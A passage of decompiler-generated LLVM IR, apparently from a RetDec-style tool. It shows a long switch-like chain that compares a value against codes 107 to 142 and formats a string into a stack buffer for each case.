dec_label_pc_c188:                                ; preds = %dec_label_pc_c154, %dec_label_pc_c160
  %v7_c18c = icmp eq i32 %v2_a95c, 107
  br i1 %v7_c18c, label %dec_label_pc_c194, label %dec_label_pc_c1bc

dec_label_pc_c194:                                ; preds = %dec_label_pc_c188
  %v2_c194 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c1a0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c1ac = load i8, i8* @global_var_324e2.76, align 1
  %v4_c1b8 = sext i8 %v3_c1a0 to i32
  %v6_c1b8 = sext i8 %v3_c1ac to i32
  %v8_c1b8 = call i32 @szprintf(i32 %v2_c194, i32 ptrtoint ([13 x i8]* @global_var_240c0.287 to i32), i32 %v4_c1b8, i32 %v6_c1b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c1bc

dec_label_pc_c1bc:                                ; preds = %dec_label_pc_c188, %dec_label_pc_c194
  %v7_c1c0 = icmp eq i32 %v2_a95c, 108
  br i1 %v7_c1c0, label %dec_label_pc_c1c8, label %dec_label_pc_c1f0

dec_label_pc_c1c8:                                ; preds = %dec_label_pc_c1bc
  %v2_c1c8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c1d4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c1e0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c1ec = sext i8 %v3_c1d4 to i32
  %v6_c1ec = sext i8 %v3_c1e0 to i32
  %v8_c1ec = call i32 @szprintf(i32 %v2_c1c8, i32 ptrtoint ([14 x i8]* @global_var_240d0.289 to i32), i32 %v4_c1ec, i32 %v6_c1ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c1f0

dec_label_pc_c1f0:                                ; preds = %dec_label_pc_c1bc, %dec_label_pc_c1c8
  %v7_c1f4 = icmp eq i32 %v2_a95c, 109
  br i1 %v7_c1f4, label %dec_label_pc_c1fc, label %dec_label_pc_c224

dec_label_pc_c1fc:                                ; preds = %dec_label_pc_c1f0
  %v2_c1fc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c208 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c214 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c220 = sext i8 %v3_c208 to i32
  %v6_c220 = sext i8 %v3_c214 to i32
  %v8_c220 = call i32 @szprintf(i32 %v2_c1fc, i32 ptrtoint ([14 x i8]* @global_var_240e0.291 to i32), i32 %v4_c220, i32 %v6_c220, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c224

dec_label_pc_c224:                                ; preds = %dec_label_pc_c1f0, %dec_label_pc_c1fc
  %v7_c228 = icmp eq i32 %v2_a95c, 110
  br i1 %v7_c228, label %dec_label_pc_c230, label %dec_label_pc_c258

dec_label_pc_c230:                                ; preds = %dec_label_pc_c224
  %v2_c230 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c23c = load i8, i8* @global_var_324e1.75, align 1
  %v3_c248 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c254 = sext i8 %v3_c23c to i32
  %v6_c254 = sext i8 %v3_c248 to i32
  %v8_c254 = call i32 @szprintf(i32 %v2_c230, i32 ptrtoint ([13 x i8]* @global_var_240f0.293 to i32), i32 %v4_c254, i32 %v6_c254, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c258

dec_label_pc_c258:                                ; preds = %dec_label_pc_c224, %dec_label_pc_c230
  %v7_c25c = icmp eq i32 %v2_a95c, 111
  br i1 %v7_c25c, label %dec_label_pc_c264, label %dec_label_pc_c28c

dec_label_pc_c264:                                ; preds = %dec_label_pc_c258
  %v2_c264 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c270 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c27c = load i8, i8* @global_var_324e2.76, align 1
  %v4_c288 = sext i8 %v3_c270 to i32
  %v6_c288 = sext i8 %v3_c27c to i32
  %v8_c288 = call i32 @szprintf(i32 %v2_c264, i32 ptrtoint ([14 x i8]* @global_var_24100.295 to i32), i32 %v4_c288, i32 %v6_c288, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c28c

dec_label_pc_c28c:                                ; preds = %dec_label_pc_c258, %dec_label_pc_c264
  %v7_c290 = icmp eq i32 %v2_a95c, 112
  br i1 %v7_c290, label %dec_label_pc_c298, label %dec_label_pc_c2c0

dec_label_pc_c298:                                ; preds = %dec_label_pc_c28c
  %v2_c298 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c2a4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c2b0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c2bc = sext i8 %v3_c2a4 to i32
  %v6_c2bc = sext i8 %v3_c2b0 to i32
  %v8_c2bc = call i32 @szprintf(i32 %v2_c298, i32 ptrtoint ([14 x i8]* @global_var_24110.297 to i32), i32 %v4_c2bc, i32 %v6_c2bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2c0

dec_label_pc_c2c0:                                ; preds = %dec_label_pc_c28c, %dec_label_pc_c298
  %v7_c2c4 = icmp eq i32 %v2_a95c, 113
  br i1 %v7_c2c4, label %dec_label_pc_c2cc, label %dec_label_pc_c2f4

dec_label_pc_c2cc:                                ; preds = %dec_label_pc_c2c0
  %v2_c2cc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c2d8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c2e4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c2f0 = sext i8 %v3_c2d8 to i32
  %v6_c2f0 = sext i8 %v3_c2e4 to i32
  %v8_c2f0 = call i32 @szprintf(i32 %v2_c2cc, i32 ptrtoint ([13 x i8]* @global_var_24120.299 to i32), i32 %v4_c2f0, i32 %v6_c2f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2f4

dec_label_pc_c2f4:                                ; preds = %dec_label_pc_c2c0, %dec_label_pc_c2cc
  %v7_c2f8 = icmp eq i32 %v2_a95c, 114
  br i1 %v7_c2f8, label %dec_label_pc_c300, label %dec_label_pc_c328

dec_label_pc_c300:                                ; preds = %dec_label_pc_c2f4
  %v2_c300 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c30c = load i8, i8* @global_var_324e1.75, align 1
  %v3_c318 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c324 = sext i8 %v3_c30c to i32
  %v6_c324 = sext i8 %v3_c318 to i32
  %v8_c324 = call i32 @szprintf(i32 %v2_c300, i32 ptrtoint ([14 x i8]* @global_var_24130.301 to i32), i32 %v4_c324, i32 %v6_c324, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c328

dec_label_pc_c328:                                ; preds = %dec_label_pc_c2f4, %dec_label_pc_c300
  %v7_c32c = icmp eq i32 %v2_a95c, 115
  br i1 %v7_c32c, label %dec_label_pc_c334, label %dec_label_pc_c35c

dec_label_pc_c334:                                ; preds = %dec_label_pc_c328
  %v2_c334 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c340 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c34c = load i8, i8* @global_var_324e2.76, align 1
  %v4_c358 = sext i8 %v3_c340 to i32
  %v6_c358 = sext i8 %v3_c34c to i32
  %v8_c358 = call i32 @szprintf(i32 %v2_c334, i32 ptrtoint ([13 x i8]* @global_var_24140.303 to i32), i32 %v4_c358, i32 %v6_c358, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c35c

dec_label_pc_c35c:                                ; preds = %dec_label_pc_c328, %dec_label_pc_c334
  %v7_c360 = icmp eq i32 %v2_a95c, 116
  br i1 %v7_c360, label %dec_label_pc_c368, label %dec_label_pc_c390

dec_label_pc_c368:                                ; preds = %dec_label_pc_c35c
  %v2_c368 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c374 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c380 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c38c = sext i8 %v3_c374 to i32
  %v6_c38c = sext i8 %v3_c380 to i32
  %v8_c38c = call i32 @szprintf(i32 %v2_c368, i32 ptrtoint ([13 x i8]* @global_var_24150.305 to i32), i32 %v4_c38c, i32 %v6_c38c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c390

dec_label_pc_c390:                                ; preds = %dec_label_pc_c35c, %dec_label_pc_c368
  %v7_c394 = icmp eq i32 %v2_a95c, 117
  br i1 %v7_c394, label %dec_label_pc_c39c, label %dec_label_pc_c3c4

dec_label_pc_c39c:                                ; preds = %dec_label_pc_c390
  %v2_c39c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c3a8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c3b4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c3c0 = sext i8 %v3_c3a8 to i32
  %v6_c3c0 = sext i8 %v3_c3b4 to i32
  %v8_c3c0 = call i32 @szprintf(i32 %v2_c39c, i32 ptrtoint ([14 x i8]* @global_var_24160.307 to i32), i32 %v4_c3c0, i32 %v6_c3c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3c4

dec_label_pc_c3c4:                                ; preds = %dec_label_pc_c390, %dec_label_pc_c39c
  %v7_c3c8 = icmp eq i32 %v2_a95c, 118
  br i1 %v7_c3c8, label %dec_label_pc_c3d0, label %dec_label_pc_c3f8

dec_label_pc_c3d0:                                ; preds = %dec_label_pc_c3c4
  %v2_c3d0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c3dc = load i8, i8* @global_var_324e1.75, align 1
  %v3_c3e8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c3f4 = sext i8 %v3_c3dc to i32
  %v6_c3f4 = sext i8 %v3_c3e8 to i32
  %v8_c3f4 = call i32 @szprintf(i32 %v2_c3d0, i32 ptrtoint ([14 x i8]* @global_var_24170.309 to i32), i32 %v4_c3f4, i32 %v6_c3f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3f8

dec_label_pc_c3f8:                                ; preds = %dec_label_pc_c3c4, %dec_label_pc_c3d0
  %v7_c3fc = icmp eq i32 %v2_a95c, 119
  br i1 %v7_c3fc, label %dec_label_pc_c404, label %dec_label_pc_c42c

dec_label_pc_c404:                                ; preds = %dec_label_pc_c3f8
  %v2_c404 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c410 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c41c = load i8, i8* @global_var_324e2.76, align 1
  %v4_c428 = sext i8 %v3_c410 to i32
  %v6_c428 = sext i8 %v3_c41c to i32
  %v8_c428 = call i32 @szprintf(i32 %v2_c404, i32 ptrtoint ([14 x i8]* @global_var_24180.311 to i32), i32 %v4_c428, i32 %v6_c428, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c42c

dec_label_pc_c42c:                                ; preds = %dec_label_pc_c3f8, %dec_label_pc_c404
  %v7_c430 = icmp eq i32 %v2_a95c, 120
  br i1 %v7_c430, label %dec_label_pc_c438, label %dec_label_pc_c460

dec_label_pc_c438:                                ; preds = %dec_label_pc_c42c
  %v2_c438 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c444 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c450 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c45c = sext i8 %v3_c444 to i32
  %v6_c45c = sext i8 %v3_c450 to i32
  %v8_c45c = call i32 @szprintf(i32 %v2_c438, i32 ptrtoint ([14 x i8]* @global_var_24190.313 to i32), i32 %v4_c45c, i32 %v6_c45c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c460

dec_label_pc_c460:                                ; preds = %dec_label_pc_c42c, %dec_label_pc_c438
  %v7_c464 = icmp eq i32 %v2_a95c, 121
  br i1 %v7_c464, label %dec_label_pc_c46c, label %dec_label_pc_c494

dec_label_pc_c46c:                                ; preds = %dec_label_pc_c460
  %v2_c46c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c478 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c484 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c490 = sext i8 %v3_c478 to i32
  %v6_c490 = sext i8 %v3_c484 to i32
  %v8_c490 = call i32 @szprintf(i32 %v2_c46c, i32 ptrtoint ([14 x i8]* @global_var_240d0.289 to i32), i32 %v4_c490, i32 %v6_c490, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c494

dec_label_pc_c494:                                ; preds = %dec_label_pc_c460, %dec_label_pc_c46c
  %v7_c498 = icmp eq i32 %v2_a95c, 122
  br i1 %v7_c498, label %dec_label_pc_c4a0, label %dec_label_pc_c4c8

dec_label_pc_c4a0:                                ; preds = %dec_label_pc_c494
  %v2_c4a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c4ac = load i8, i8* @global_var_324e1.75, align 1
  %v3_c4b8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c4c4 = sext i8 %v3_c4ac to i32
  %v6_c4c4 = sext i8 %v3_c4b8 to i32
  %v8_c4c4 = call i32 @szprintf(i32 %v2_c4a0, i32 ptrtoint ([13 x i8]* @global_var_241a0.315 to i32), i32 %v4_c4c4, i32 %v6_c4c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4c8

dec_label_pc_c4c8:                                ; preds = %dec_label_pc_c494, %dec_label_pc_c4a0
  %v7_c4cc = icmp eq i32 %v2_a95c, 123
  br i1 %v7_c4cc, label %dec_label_pc_c4d4, label %dec_label_pc_c4fc

dec_label_pc_c4d4:                                ; preds = %dec_label_pc_c4c8
  %v2_c4d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c4e0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c4ec = load i8, i8* @global_var_324e2.76, align 1
  %v4_c4f8 = sext i8 %v3_c4e0 to i32
  %v6_c4f8 = sext i8 %v3_c4ec to i32
  %v8_c4f8 = call i32 @szprintf(i32 %v2_c4d4, i32 ptrtoint ([12 x i8]* @global_var_241b0.317 to i32), i32 %v4_c4f8, i32 %v6_c4f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4fc

dec_label_pc_c4fc:                                ; preds = %dec_label_pc_c4c8, %dec_label_pc_c4d4
  %v7_c500 = icmp eq i32 %v2_a95c, 124
  br i1 %v7_c500, label %dec_label_pc_c508, label %dec_label_pc_c530

dec_label_pc_c508:                                ; preds = %dec_label_pc_c4fc
  %v2_c508 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c514 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c520 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c52c = sext i8 %v3_c514 to i32
  %v6_c52c = sext i8 %v3_c520 to i32
  %v8_c52c = call i32 @szprintf(i32 %v2_c508, i32 ptrtoint ([14 x i8]* @global_var_241bc.319 to i32), i32 %v4_c52c, i32 %v6_c52c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c530

dec_label_pc_c530:                                ; preds = %dec_label_pc_c4fc, %dec_label_pc_c508
  %v7_c534 = icmp eq i32 %v2_a95c, 125
  br i1 %v7_c534, label %dec_label_pc_c53c, label %dec_label_pc_c564

dec_label_pc_c53c:                                ; preds = %dec_label_pc_c530
  %v2_c53c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c548 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c554 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c560 = sext i8 %v3_c548 to i32
  %v6_c560 = sext i8 %v3_c554 to i32
  %v8_c560 = call i32 @szprintf(i32 %v2_c53c, i32 ptrtoint ([14 x i8]* @global_var_241cc.321 to i32), i32 %v4_c560, i32 %v6_c560, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c564

dec_label_pc_c564:                                ; preds = %dec_label_pc_c530, %dec_label_pc_c53c
  %v7_c568 = icmp eq i32 %v2_a95c, 126
  br i1 %v7_c568, label %dec_label_pc_c570, label %dec_label_pc_c598

dec_label_pc_c570:                                ; preds = %dec_label_pc_c564
  %v2_c570 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c57c = load i8, i8* @global_var_324e1.75, align 1
  %v3_c588 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c594 = sext i8 %v3_c57c to i32
  %v6_c594 = sext i8 %v3_c588 to i32
  %v8_c594 = call i32 @szprintf(i32 %v2_c570, i32 ptrtoint ([14 x i8]* @global_var_241bc.319 to i32), i32 %v4_c594, i32 %v6_c594, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c598

dec_label_pc_c598:                                ; preds = %dec_label_pc_c564, %dec_label_pc_c570
  %v7_c59c = icmp eq i32 %v2_a95c, 127
  br i1 %v7_c59c, label %dec_label_pc_c5a4, label %dec_label_pc_c5cc

dec_label_pc_c5a4:                                ; preds = %dec_label_pc_c598
  %v2_c5a4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c5b0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c5bc = load i8, i8* @global_var_324e2.76, align 1
  %v4_c5c8 = sext i8 %v3_c5b0 to i32
  %v6_c5c8 = sext i8 %v3_c5bc to i32
  %v8_c5c8 = call i32 @szprintf(i32 %v2_c5a4, i32 ptrtoint ([14 x i8]* @global_var_241dc.323 to i32), i32 %v4_c5c8, i32 %v6_c5c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5cc

dec_label_pc_c5cc:                                ; preds = %dec_label_pc_c598, %dec_label_pc_c5a4
  %v7_c5d0 = icmp eq i32 %v2_a95c, 128
  br i1 %v7_c5d0, label %dec_label_pc_c5d8, label %dec_label_pc_c600

dec_label_pc_c5d8:                                ; preds = %dec_label_pc_c5cc
  %v2_c5d8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c5e4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c5f0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c5fc = sext i8 %v3_c5e4 to i32
  %v6_c5fc = sext i8 %v3_c5f0 to i32
  %v8_c5fc = call i32 @szprintf(i32 %v2_c5d8, i32 ptrtoint ([14 x i8]* @global_var_241ec.325 to i32), i32 %v4_c5fc, i32 %v6_c5fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c600

dec_label_pc_c600:                                ; preds = %dec_label_pc_c5cc, %dec_label_pc_c5d8
  %v7_c604 = icmp eq i32 %v2_a95c, 129
  br i1 %v7_c604, label %dec_label_pc_c60c, label %dec_label_pc_c634

dec_label_pc_c60c:                                ; preds = %dec_label_pc_c600
  %v2_c60c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c618 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c624 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c630 = sext i8 %v3_c618 to i32
  %v6_c630 = sext i8 %v3_c624 to i32
  %v8_c630 = call i32 @szprintf(i32 %v2_c60c, i32 ptrtoint ([14 x i8]* @global_var_241fc.327 to i32), i32 %v4_c630, i32 %v6_c630, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c634

dec_label_pc_c634:                                ; preds = %dec_label_pc_c600, %dec_label_pc_c60c
  %v7_c638 = icmp eq i32 %v2_a95c, 130
  br i1 %v7_c638, label %dec_label_pc_c640, label %dec_label_pc_c668

dec_label_pc_c640:                                ; preds = %dec_label_pc_c634
  %v2_c640 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c64c = load i8, i8* @global_var_324e1.75, align 1
  %v3_c658 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c664 = sext i8 %v3_c64c to i32
  %v6_c664 = sext i8 %v3_c658 to i32
  %v8_c664 = call i32 @szprintf(i32 %v2_c640, i32 ptrtoint ([14 x i8]* @global_var_2420c.329 to i32), i32 %v4_c664, i32 %v6_c664, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c668

dec_label_pc_c668:                                ; preds = %dec_label_pc_c634, %dec_label_pc_c640
  %v7_c66c = icmp eq i32 %v2_a95c, 131
  br i1 %v7_c66c, label %dec_label_pc_c674, label %dec_label_pc_c69c

dec_label_pc_c674:                                ; preds = %dec_label_pc_c668
  %v2_c674 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c680 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c68c = load i8, i8* @global_var_324e2.76, align 1
  %v4_c698 = sext i8 %v3_c680 to i32
  %v6_c698 = sext i8 %v3_c68c to i32
  %v8_c698 = call i32 @szprintf(i32 %v2_c674, i32 ptrtoint ([14 x i8]* @global_var_2421c.331 to i32), i32 %v4_c698, i32 %v6_c698, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c69c

dec_label_pc_c69c:                                ; preds = %dec_label_pc_c668, %dec_label_pc_c674
  %v7_c6a0 = icmp eq i32 %v2_a95c, 132
  br i1 %v7_c6a0, label %dec_label_pc_c6a8, label %dec_label_pc_c6d0

dec_label_pc_c6a8:                                ; preds = %dec_label_pc_c69c
  %v2_c6a8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c6b4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c6c0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c6cc = sext i8 %v3_c6b4 to i32
  %v6_c6cc = sext i8 %v3_c6c0 to i32
  %v8_c6cc = call i32 @szprintf(i32 %v2_c6a8, i32 ptrtoint ([14 x i8]* @global_var_2422c.333 to i32), i32 %v4_c6cc, i32 %v6_c6cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c69c, %dec_label_pc_c6a8
  %v7_c6d4 = icmp eq i32 %v2_a95c, 133
  br i1 %v7_c6d4, label %dec_label_pc_c6dc, label %dec_label_pc_c704

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c6d0
  %v2_c6dc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c6e8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c6f4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c700 = sext i8 %v3_c6e8 to i32
  %v6_c700 = sext i8 %v3_c6f4 to i32
  %v8_c700 = call i32 @szprintf(i32 %v2_c6dc, i32 ptrtoint ([14 x i8]* @global_var_2423c.335 to i32), i32 %v4_c700, i32 %v6_c700, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c704

dec_label_pc_c704:                                ; preds = %dec_label_pc_c6d0, %dec_label_pc_c6dc
  %v7_c708 = icmp eq i32 %v2_a95c, 134
  br i1 %v7_c708, label %dec_label_pc_c710, label %dec_label_pc_c738

dec_label_pc_c710:                                ; preds = %dec_label_pc_c704
  %v2_c710 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c71c = load i8, i8* @global_var_324e1.75, align 1
  %v3_c728 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c734 = sext i8 %v3_c71c to i32
  %v6_c734 = sext i8 %v3_c728 to i32
  %v8_c734 = call i32 @szprintf(i32 %v2_c710, i32 ptrtoint ([14 x i8]* @global_var_2424c.337 to i32), i32 %v4_c734, i32 %v6_c734, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c738

dec_label_pc_c738:                                ; preds = %dec_label_pc_c704, %dec_label_pc_c710
  %v7_c73c = icmp eq i32 %v2_a95c, 135
  br i1 %v7_c73c, label %dec_label_pc_c744, label %dec_label_pc_c76c

dec_label_pc_c744:                                ; preds = %dec_label_pc_c738
  %v2_c744 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c750 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c75c = load i8, i8* @global_var_324e2.76, align 1
  %v4_c768 = sext i8 %v3_c750 to i32
  %v6_c768 = sext i8 %v3_c75c to i32
  %v8_c768 = call i32 @szprintf(i32 %v2_c744, i32 ptrtoint ([14 x i8]* @global_var_2425c.339 to i32), i32 %v4_c768, i32 %v6_c768, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c76c

dec_label_pc_c76c:                                ; preds = %dec_label_pc_c738, %dec_label_pc_c744
  %v7_c770 = icmp eq i32 %v2_a95c, 136
  br i1 %v7_c770, label %dec_label_pc_c778, label %dec_label_pc_c7a0

dec_label_pc_c778:                                ; preds = %dec_label_pc_c76c
  %v2_c778 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c784 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c790 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c79c = sext i8 %v3_c784 to i32
  %v6_c79c = sext i8 %v3_c790 to i32
  %v8_c79c = call i32 @szprintf(i32 %v2_c778, i32 ptrtoint ([14 x i8]* @global_var_2426c.341 to i32), i32 %v4_c79c, i32 %v6_c79c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7a0

dec_label_pc_c7a0:                                ; preds = %dec_label_pc_c76c, %dec_label_pc_c778
  %v7_c7a4 = icmp eq i32 %v2_a95c, 137
  br i1 %v7_c7a4, label %dec_label_pc_c7ac, label %dec_label_pc_c7d4

dec_label_pc_c7ac:                                ; preds = %dec_label_pc_c7a0
  %v2_c7ac = ptrtoint i32* %stack_var_-36 to i32
  %v3_c7b8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c7c4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c7d0 = sext i8 %v3_c7b8 to i32
  %v6_c7d0 = sext i8 %v3_c7c4 to i32
  %v8_c7d0 = call i32 @szprintf(i32 %v2_c7ac, i32 ptrtoint ([13 x i8]* @global_var_2427c.343 to i32), i32 %v4_c7d0, i32 %v6_c7d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7d4

dec_label_pc_c7d4:                                ; preds = %dec_label_pc_c7a0, %dec_label_pc_c7ac
  %v7_c7d8 = icmp eq i32 %v2_a95c, 138
  br i1 %v7_c7d8, label %dec_label_pc_c7e0, label %dec_label_pc_c808

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c7d4
  %v2_c7e0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c7ec = load i8, i8* @global_var_324e1.75, align 1
  %v3_c7f8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c804 = sext i8 %v3_c7ec to i32
  %v6_c804 = sext i8 %v3_c7f8 to i32
  %v8_c804 = call i32 @szprintf(i32 %v2_c7e0, i32 ptrtoint ([13 x i8]* @global_var_2428c.345 to i32), i32 %v4_c804, i32 %v6_c804, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c808

dec_label_pc_c808:                                ; preds = %dec_label_pc_c7d4, %dec_label_pc_c7e0
  %v7_c80c = icmp eq i32 %v2_a95c, 139
  br i1 %v7_c80c, label %dec_label_pc_c814, label %dec_label_pc_c83c

dec_label_pc_c814:                                ; preds = %dec_label_pc_c808
  %v2_c814 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c820 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c82c = load i8, i8* @global_var_324e2.76, align 1
  %v4_c838 = sext i8 %v3_c820 to i32
  %v6_c838 = sext i8 %v3_c82c to i32
  %v8_c838 = call i32 @szprintf(i32 %v2_c814, i32 ptrtoint ([13 x i8]* @global_var_2429c.347 to i32), i32 %v4_c838, i32 %v6_c838, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c83c

dec_label_pc_c83c:                                ; preds = %dec_label_pc_c808, %dec_label_pc_c814
  %v7_c840 = icmp eq i32 %v2_a95c, 140
  br i1 %v7_c840, label %dec_label_pc_c848, label %dec_label_pc_c870

dec_label_pc_c848:                                ; preds = %dec_label_pc_c83c
  %v2_c848 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c854 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c860 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c86c = sext i8 %v3_c854 to i32
  %v6_c86c = sext i8 %v3_c860 to i32
  %v8_c86c = call i32 @szprintf(i32 %v2_c848, i32 ptrtoint ([13 x i8]* @global_var_242ac.349 to i32), i32 %v4_c86c, i32 %v6_c86c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c870

dec_label_pc_c870:                                ; preds = %dec_label_pc_c83c, %dec_label_pc_c848
  %v7_c874 = icmp eq i32 %v2_a95c, 141
  br i1 %v7_c874, label %dec_label_pc_c87c, label %dec_label_pc_c8a4

dec_label_pc_c87c:                                ; preds = %dec_label_pc_c870
  %v2_c87c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c888 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c894 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c8a0 = sext i8 %v3_c888 to i32
  %v6_c8a0 = sext i8 %v3_c894 to i32
  %v8_c8a0 = call i32 @szprintf(i32 %v2_c87c, i32 ptrtoint ([13 x i8]* @global_var_242bc.351 to i32), i32 %v4_c8a0, i32 %v6_c8a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8a4

dec_label_pc_c8a4:                                ; preds = %dec_label_pc_c870, %dec_label_pc_c87c
  %v7_c8a8 = icmp eq i32 %v2_a95c, 142
  br i1 %v7_c8a8, label %dec_label_pc_c8b0, label %dec_label_pc_c8d8

dec_label_pc_c8b0:                                ; preds = %dec_label_pc_c8a4
  %v2_c8b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c8bc = load i8, i8* @global_var_324e1.75, align 1
  %v3_c8c8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c8d4 = sext i8 %v3_c8bc to i32
  %v6_c8d4 = sext i8 %v3_c8c8 to i32
  %v8_c8d4 = call i32 @szprintf(i32 %v2_c8b0, i32 ptrtoint ([13 x i8]* @global_var_242cc.353 to i32), i32 %v4_c8d4, i32 %v6_c8d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8d8

